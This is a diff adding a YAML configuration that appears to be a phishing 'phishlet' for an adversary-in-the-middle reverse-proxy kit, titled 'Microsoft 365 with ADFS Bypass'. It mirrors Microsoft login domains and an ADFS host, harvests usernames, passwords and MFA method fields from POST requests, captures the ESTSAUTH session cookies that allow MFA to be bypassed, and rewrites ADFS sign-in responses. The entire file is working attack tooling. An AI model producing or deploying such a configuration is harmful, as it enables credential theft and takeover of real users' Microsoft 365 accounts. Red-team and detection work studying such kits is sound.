@@ -1,0 +1,91 @@
+name: 'Microsoft 365 with ADFS Bypass'
+
+min_ver: '3.1.0'
+
+proxy_hosts:
+
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: false, auto_filter: true}
+
+  - {phish_sub: 'portal', orig_sub: 'portal', domain: 'microsoftonline.com', session: true, is_landing: false, auto_filter: true}
+
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'microsoftonline.com', session: false, is_landing: false, auto_filter: true}
+
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing: false, auto_filter: true}
+
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: true}
+
+  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msftauth.net', session: false, is_landing: false, auto_filter: true}
+
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'live.com', session: false, is_landing: false, auto_filter: true}
+
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'microsoft365.com', session: false, is_landing: false, auto_filter: true}
+
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'live.com', session: false, is_landing: false, auto_filter: true}
+
+  - {phish_sub: 'adfs', orig_sub: 'adfs', domain: 'example.com', session: true, is_landing: true}
+
+  - {phish_sub: 'adfs', orig_sub: 'adfs', domain: 'example.com:443', session: true, is_landing: false}
+
+sub_filters:
+
+  - {triggers_on: 'adfs.example.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+  - {triggers_on: 'adfs.example.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+auth_tokens:
+
+  - domain: '.login.microsoftonline.com'
+
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']
+
+    type: 'cookie'
+
+credentials:
+
+  username:
+
+    key: '(login|UserName)'
+
+    search: '(.*)'
+
+    type: 'post'
+
+  password:
+
+    key: '(passwd|Password|accesspass)'
+
+    search: '(.*)'
+
+    type: 'post'
+
+  custom:
+
+    - key: 'mfaAuthMethod'
+
+      search: '(.*)'
+
+      type: 'post'
+
+login:
+
+  domain: 'login.microsoftonline.com'
+
+  path: '/'
+
+force_post:
+
+  - path: '/login.srf'
+
+    search:
+
+      - {key: 'wa', search: '.*'}
+
+      - {key: 'wresult', search: '.*'}
+
+      - {key: 'wctx', search: '.*'}
+
+    force:
+
+       - {key: 'wresult', search: 'http\:\/\/adfs\.example\.com\:443', value: 'http://adfs.example.com'}
+
+    type: 'post'
